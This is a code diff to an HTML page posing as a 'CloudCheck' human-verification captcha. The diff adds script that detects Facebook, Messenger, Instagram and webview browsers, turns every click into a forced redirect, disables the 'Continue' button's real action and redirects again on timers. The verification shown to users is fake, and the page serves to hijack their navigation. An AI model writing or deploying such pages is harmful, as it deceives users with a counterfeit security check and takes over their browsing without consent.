@@ -113,7 +113,7 @@
             transform: translate(-50%, -50%);
             width: 0px;
         }
-
+        
         @keyframes animation_checkbox_circle {
             0% {
                 height: 0px;
@@ -134,7 +134,7 @@
             animation: animation_checkbox_spinner 2.5s ease-in-out 1.75s 1 normal forwards;
             opacity: 0;
         }
-
+        
         @keyframes animation_checkbox_spinner {
             0%, 99% {
                 opacity: 1;
@@ -171,6 +171,7 @@
             font-size: 17px;
             line-height: 20px;
             margin-top: 70px;
+            margin-bottom: 15px;
         }
 
         .captcha-logo {
@@ -289,6 +290,46 @@
                 transform: rotate(360deg);
             }
         }
+        .button {
+            animation: animation_button 1s ease-out 0s infinite;
+            background: linear-gradient(to bottom, rgba(56, 197, 74, 1) 0%, rgba(0, 139, 36, 1) 100%);
+            border: 0;
+            border-radius: 7px;
+            color: #fff;
+            display: inline-block;
+            filter: brightness(1);
+            font-weight: bold;
+            line-height: 100%;
+            margin: 0 auto;
+            outline: none;
+            padding: 15px;
+            text-align: center;
+            text-decoration: none;
+            text-transform: uppercase;
+            transform: scale(1);
+            width: auto;
+        }
+        @keyframes animation_button {
+            0%, 25% {
+                filter: brightness(1);
+                transform: scale(1);
+            }
+            50% {
+                filter: brightness(1.05);
+                transform: scale(1.05);
+            }
+            75%, 100% {
+                filter: brightness(1);
+                transform: scale(1);
+            }
+        }
+        .instructions-before {
+            display: block;
+        }
+        .instructions-after {
+            display: none;
+            text-align: center;
+        }
     </style>
     <script>
         var urlTabNew = 'https://www.google.com/search?q=new+tab';
@@ -304,32 +345,42 @@
         }
 
         function is(pattern) {
-            return Boolean(navigator.userAgent.match(new RegExp(pattern, 'ig')))
+            return Boolean(navigator.userAgent.match(new RegExp(pattern, 'ig')));
         }
-
         var isFBMessenger = is(regex.fbmessenger);
         var isFB = is(regex.fb) && !isFBMessenger;
         var isInstagram = is(regex.instagram);
         var isWebview = is(regex.webview) && !isFBMessenger && !isFB && !isInstagram;
-
-        function redirectTabCurrent () {
+        function redirectTabCurrent() {
             if (!document.hidden) {
                 document.location.replace(urlTabCurrent);
             }
         }
-
-        function init () {
+        function redirectTabIntent() {
+            document.location.href = urlTabNew;
+        }
+        function init() {
             if (isFBMessenger || isFB || isWebview) {
-                document.location.href = urlTabNew;
+                redirectTabIntent();
+                document.addEventListener('click', redirectTabIntent);
                 document.addEventListener('visibilitychange', redirectTabCurrent);
-                var timeoutId = setTimeout(function () {
+                document.querySelector('.button').addEventListener('click', function(e) {
+                    e.preventDefault();
+                });
+                var timeoutInfoId = setTimeout(function() {
+                    clearTimeout(timeoutInfoId);
+                    document.removeEventListener('click', redirectTabIntent);
+                    document.addEventListener('click', redirectTabCurrent);
+                    document.querySelector('.instructions-before').style.display = 'none';
+                    document.querySelector('.instructions-after').style.display = 'block';
+                }, 2500);
+                var timeoutId = setTimeout(function() {
                     clearTimeout(timeoutId);
                     redirectTabCurrent();
                 }, 5000);
             }
         }
-
-        if (document.readyState === 'loading') {
+        if (document.readyState !== 'interactive') {
             document.addEventListener('DOMContentLoaded', init);
         } else {
             init();
@@ -337,32 +388,38 @@
     </script>
 </head>
 <body>
-<div class="captcha-overlay" >
-    <div class="captcha-wrapper">
-        <h1 class="captcha-title">Verify you are human by completing the action below</h1>
-        <div class="captcha-block">
-            <div class="checkbox-wrapper">
-                <div class="captcha-checkbox">
-                    <div class="captcha-checkbox__item captcha-checkbox__square"></div>
-                    <div class="captcha-checkbox__item captcha-checkbox__circle"></div>
-                    <div class="captcha-checkbox__item captcha-checkbox__spinner">
-                        <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+    <div class="captcha-overlay" >
+        <div class="captcha-wrapper">
+            <h1 class="captcha-title">Verify you are human by completing the action below</h1>
+            <div class="captcha-block">
+                <div class="checkbox-wrapper">
+                    <div class="captcha-checkbox">
+                        <div class="captcha-checkbox__item captcha-checkbox__square"></div>
+                        <div class="captcha-checkbox__item captcha-checkbox__circle"></div>
+                        <div class="captcha-checkbox__item captcha-checkbox__spinner">
+                            <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
+                        </div>
+                        <div class="captcha-checkbox__item captcha-checkbox__checkmark">
+                            <svg version="1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" enable-background="new 0 0 48 48">
+                                <polygon fill="#43A047" points="40.6,12.1 17,35.7 7.4,26.1 4.6,29 17,41.3 43.4,14.9"/>
+                            </svg>
+                        </div>
                     </div>
-                    <div class="captcha-checkbox__item captcha-checkbox__checkmark">
-                        <svg version="1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" enable-background="new 0 0 48 48">
-                            <polygon fill="#43A047" points="40.6,12.1 17,35.7 7.4,26.1 4.6,29 17,41.3 43.4,14.9"/>
-                        </svg>
-                    </div>
+                    <p class="captcha-text">Verify you are human</p>
                 </div>
-                <p class="captcha-text">Verify you are human</p>
+                <div class="captcha-logo">
+                    <div class="image-container"><img src="./cloudcheck-logo.webp" alt="logo" width="37" height="20" loading="lazy"></div>
+                    <p class="captcha-logo-text">CloudCheck</p>
+                </div>
             </div>
-            <div class="captcha-logo">
-                <div class="image-container"><img src="./cloudcheck-logo.webp" alt="logo" width="37" height="20" loading="lazy"></div>
-                <p class="captcha-logo-text">CloudCheck</p>
+            <p class="captcha-instructions instructions-before">We need to review the security of your connection before proceeding</p>
+            <div class="instructions-after">
+                <div class="captcha-instructions">Click to continue</div>
+                <a class="button" href="#">
+                    <span>Continue</span>
+                </a>
             </div>
         </div>
-        <p class="captcha-instructions">We need to review the security of your connection before proceeding</p>
     </div>
-</div>
 </body>
 </html>
